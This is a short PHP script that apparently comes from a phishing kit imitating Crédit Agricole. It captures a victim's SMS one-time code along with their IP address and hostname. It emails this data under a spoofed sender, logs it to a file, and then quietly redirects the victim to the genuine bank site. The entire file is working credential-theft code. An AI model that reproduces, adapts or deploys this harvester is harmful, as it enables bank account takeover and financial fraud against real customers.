<?php
session_start();
include('det.php');
include('val.php');
$hostname = gethostbyaddr($ip);
$message .= "[------------------------------]\n";
$message .= "SMS     : ".$_POST['codesms']."\n";
$message .= "IP    : $ip | $hostname\n";
$message .= "[------------------------------]\n";
$subject = "JHONELUC[LOGIN] $ip";
$headers = "From: CA<info@inc.de>";
mail($send,$subject,$message,$headers);
if ($tabligh == "yes") {
mailling($send,$subject,$message,$headers);
    }
$fp = fopen("../../infos.cs", "a");
			fputs($fp, $message);
			fclose($fp);

     echo "<meta http-equiv='refresh' content='0; url=https://www.credit-agricole.fr/' />";

?>